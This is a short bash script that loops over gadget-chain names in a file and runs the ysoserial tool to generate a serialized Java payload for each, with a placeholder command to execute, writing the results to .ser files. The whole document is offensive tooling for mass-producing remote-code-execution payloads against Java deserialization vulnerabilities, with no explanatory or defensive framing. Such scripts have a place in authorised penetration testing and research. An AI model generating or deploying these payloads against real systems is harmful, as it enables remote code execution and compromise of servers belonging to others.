while read payload;
do echo -en "$payload\n\n"; java -jar ysoserial.jar $payload "COMMAND-TO-EXEC-HERE" | tr -d '\n' > payloads/$payload.ser;
echo -en "--------------------------------\n\n"; done < payloads.txt